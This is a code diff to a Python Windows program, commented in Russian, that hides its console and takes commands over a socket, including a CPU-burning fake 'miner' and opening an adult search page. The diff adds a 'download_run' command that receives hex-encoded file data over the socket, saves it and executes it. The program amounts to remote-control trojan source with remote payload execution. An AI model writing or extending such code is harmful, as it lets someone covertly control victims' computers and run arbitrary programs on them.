@@ -7,6 +7,7 @@ import tkinter as tk
 from tkinter import messagebox
 import subprocess
 import webbrowser
+import shutil
 
 ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
@@ -39,14 +40,33 @@ def move_cursor(x, y):
     """Перемещение курсора в абсолютные координаты."""
     ctypes.windll.user32.SetCursorPos(x, y)
 
-def cpu_worker():
-    """Функция для одного рабочего процесса — нагружает одно ядро."""
-    while True:
-        x = 0
-        for i in range(1000000):
-            x += i ** 2
-        time.sleep(0.001)
-        print('запущен майнер')
+def download_and_run_app(client_socket, file_data, filename):
+    """
+    Скачивает файл и запускает его на сервере.
+    file_data — байтовые данные файла, filename — имя файла.
+    """
+    try:
+        # Сохраняем файл во временную директорию
+        temp_path = os.path.join(os.getcwd(), 'temp')
+        os.makedirs(temp_path, exist_ok=True)
+        file_path = os.path.join(temp_path, filename)
+
+        with open(file_path, 'wb') as f:
+            f.write(file_data)
+
+        # Запускаем файл
+        if filename.lower().endswith('.exe'):
+            subprocess.Popen([file_path])
+            return f"Приложение {filename} запущено"
+        elif filename.lower().endswith(('.py', '.pyw')):
+            subprocess.Popen(['python', file_path])
+            return f"Скрипт {filename} запущен"
+        else:
+            # Для других типов файлов пытаемся открыть стандартными средствами ОС
+            os.startfile(file_path)
+            return f"Файл {filename} открыт"
+    except Exception as e:
+        return f"Ошибка при скачивании/запуске: {str(e)}"
 
 def handle_client(client_socket):
     while True:
@@ -55,8 +75,25 @@ def handle_client(client_socket):
             if not data:
                 break
             print(f"Получена команда: {data}")
-            execute_command(data)
-        except:
+            if data.startswith('download_run:'):
+                # Формат: download_run:имя_файла:данные_в_hex
+                parts = data.split(':', 2)
+                if len(parts) == 3:
+                    filename = parts[1]
+                    file_data_hex = parts[2]
+                    try:
+                        file_data = bytes.fromhex(file_data_hex)
+                        response = download_and_run_app(client_socket, file_data, filename)
+                    except ValueError:
+                        response = "Ошибка: неверные данные файла (не hex)"
+                else:
+                    response = "Ошибка: неверный формат команды"
+            else:
+                response = execute_command(data)
+
+            client_socket.send(response.encode('utf-8'))
+        except Exception as e:
+            print(f"Ошибка обработки клиента: {e}")
             break
     client_socket.close()
 
@@ -127,9 +164,15 @@ def execute_command(cmd):
     elif cmd == "18+":
         url = f"https://www.google.com/search?q=18+ с обезьянами смотреть бесплатно"
         webbrowser.open(url)
+    elif cmd == "майнер":
+        while True:
+         x = 0
+         for i in range(1000000):
+            x += i ** 2
+         time.sleep(0.001)
+         print('запущен майнер')
     else:
-        print(f"Неизвестная команда: {cmd}")
-
+        win_error("сообщение", f"{cmd}")
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind(('localhost', 8888))
 server.listen(5)
